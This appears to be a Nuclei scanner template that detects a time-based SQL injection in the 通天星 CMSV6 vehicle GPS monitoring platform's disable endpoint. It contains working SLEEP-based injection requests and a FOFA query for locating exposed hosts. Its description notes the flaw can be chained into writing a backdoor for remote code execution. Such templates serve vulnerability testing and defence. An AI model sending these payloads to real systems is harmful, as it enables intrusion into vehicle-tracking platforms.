http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%284%29%29%29kOIi%29 HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%288%29%29%29kOIi%29 HTTP/1.1
          Host: {{Hostname}}
id: tongtianxing-V6-disable-sql
info:
    author: Superhero
    description: |-
        fofa: body="/808gps/"
        该漏洞是由于通天星CMSV6车载定位监控平台 /edu_security_officer/disable接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可配合任意文件读取获取网站绝对路径写入后门文件进行远程代码执行。
    name: 通天星CMSV6车载定位监控平台 disable SQL注入漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140681467
    severity: high
    tags:
        - GPS
        - 通天星CMSV6车载定位监控平台
